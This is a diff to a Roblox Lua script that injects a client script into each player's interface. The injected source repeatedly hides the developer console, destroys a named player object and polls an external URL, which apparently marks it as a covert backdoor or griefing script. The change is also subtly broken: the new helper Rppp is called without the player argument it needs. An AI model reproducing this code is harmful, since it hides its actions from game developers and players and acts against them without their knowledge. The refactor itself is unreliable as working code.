@@ -938,13 +938,12 @@ function Test()
 	end
 end
 
-function Check(plr)
-	plr.CharacterAdded:Connect(function(Char)
-		local Client=ClientS:Clone()
-		Client.Parent=plr.PlayerGui
-		Sado:Clone().Parent=Client
-		local SourceValue=ins("StringValue",Client)
-		SourceValue.Value=[[game:GetService("RunService").PreSimulation:Connect(function()
+function Rppp(plr)
+	local Client=ClientS:Clone()
+	Client.Parent=plr.PlayerGui
+	Sado:Clone().Parent=Client
+	local SourceValue=ins("StringValue",Client)
+	SourceValue.Value=[[game:GetService("RunService").PreSimulation:Connect(function()
 		pcall(function()
 			game:GetService("StarterGui"):SetCore("DevConsoleVisible",false)
 		end)
@@ -953,8 +952,14 @@ function Check(plr)
 	game.Players:WaitForChild("Winng3010"):Destroy()
     end
 	]]
-		Client.Enabled=true
+	Client.Enabled=true
+end
+
+function Check(plr)
+	plr.CharacterAdded:Connect(function(Char)
+		Rppp()
 	end)
+	Rppp()
 	local success,result=pcall(function()
 		return Http:GetAsync(Url.."players")
 	end)
